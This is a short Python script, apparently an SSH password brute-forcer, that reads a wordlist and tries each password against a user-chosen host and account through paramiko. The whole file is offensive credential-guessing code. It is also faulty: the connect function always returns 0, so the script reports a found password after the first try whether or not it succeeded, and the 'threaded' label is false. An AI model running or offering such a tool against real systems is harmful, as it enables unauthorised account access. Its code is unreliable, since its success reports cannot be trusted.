import socket

import paramiko, sys, os, termcolor


stop_flag = 0

def ssh_connect(password, code=0):
    global stop_flag
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        ssh.connect(host, port=22, username=username, password=password)
        stop_flag = 1
        print(termcolor.colored('[+] Found Password: ' + password + ': For Account' + username + 'green'))
    except:
        print(termcolor.colored(('[-] Incorrect Login: ' + password), 'red'))
    ssh.close()
    return code

host = input('[+] Target Address: ')
username = input('[+] SSH Username: ')
input_file = input('[+] Password File: ')
print('\n')

if os.path.exists(input_file) == False:
    print('[!!] That File/Path Doesnt Exist')
    sys.exit()
print('* * * Starting Threaded Brute force on: ' + host + ' With Account: ' + username + '* * * ')
with open(input_file, 'r') as file:
    for line in file.readlines():
        password = line.strip()
        try:
            response = ssh_connect(password)
            if response == 0:
                print(termcolor.colored(('[+] Found Password: ' + password + ', For Account: ' + username), 'green'))
                break
            elif response == 1:
                print('[-] Incorrect Login: ' + password)
            elif response == 2:
                print('[!!] Cant Connect')
                sys.exit(1)
        except Exception as e:
            print(e)
            pass


